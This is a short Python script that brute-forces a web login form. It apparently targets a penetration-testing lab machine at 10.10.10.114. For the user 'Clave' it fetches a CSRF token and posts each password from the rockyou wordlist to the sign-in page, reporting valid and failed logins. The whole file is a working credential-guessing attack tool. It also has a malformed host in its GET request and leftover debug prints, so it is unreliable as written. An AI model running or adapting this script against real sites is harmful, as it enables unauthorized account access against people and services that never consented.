import requests
#from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re
import socket

#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.setsockopt(socket.SOL_SOCKET, 25, 'tun0')
#s.bind(('10.10.16.51',0))

csrfTokenName= "csrf-token"
csrfPostName="authenticity_token"
username="Clave"
usernameFld="user[login]"
passFld="user[password]"
LoginName="user[remember_me]"
Login="0"
url="http://10.10.10.114/users/sign_in"
passList="/usr/share/wordlists/rockyou.txt"
incorrectText="Invalid"

#re_csrf = csrfTokenName+'" content="(.*?)"'
s = requests.session()
re_csrf= 'csrf-token" content="(.*?)"'
#requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

lines = open(passList)
for password in lines:
    r = s.get("http://10.10.10.114.com/users/sign_in", allow_redirects=False)
    print("hi")
    print(r.text)
    csrf = re.findall(re_csrf, r.text)[1]
    login={csrfPostName:csrf,usernameFld: username,passFld:password[:-1],LoginName:Login}
    r=s.post(url,data=login)
    if incorrectText in r.text:
        print("Failed Login %s:%s"%(username,password[:-1]))
    else:
        print("Valid Login %s:%s"%(username,password[:-1]))
        s.cookies.clear()
